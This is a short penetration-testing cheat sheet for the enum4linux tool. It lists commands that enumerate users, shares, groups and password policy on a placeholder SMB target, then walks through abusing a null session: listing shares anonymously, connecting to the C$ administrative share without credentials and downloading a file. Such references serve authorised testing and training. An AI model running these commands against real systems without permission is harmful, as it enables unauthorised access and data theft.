---
description: https://www.kali.org/tools/enum4linux/
---

# 🐧 Enum4linux

```bash
enum4linux -o <TARGET_IP>
enum4linux -U <TARGET_IP>
enum4linux -S <TARGET_IP>
enum4linux -G <TARGET_IP>
enum4linux -i <TARGET_IP>
enum4linux -r -u "<USER>" -p "<PW>" <TARGET_IP>
enum4linux -a -u "<USER>" -p "<PW>" <TARGET_IP>
enum4linux -U -M -S -P -G <TARGET_IP>

## NULL SESSIONS

# 1 - Use “enum4linux -n” to make sure if “<20>” exists:
enum4linux -n <TARGET_IP>
# 2 - If “<20>” exists, it means Null Session could be exploited. Utilize the following command to get more details:
enum4linux <TARGET_IP>
# 3 - If confirmed that Null Session exists, you can remotely list all share of the target:
smbclient -L WORKGROUP -I <TARGET_IP> -N -U ""
# 4 - You also can connect the remote server by applying the following command:
smbclient \\\\<TARGET_IP>\\c$ -N -U ""
# 5 - Download those files stored on the share drive:
smb: \> get file_shared.txt
```

{% embed url="https://www.kali.org/tools/enum4linux/" %}
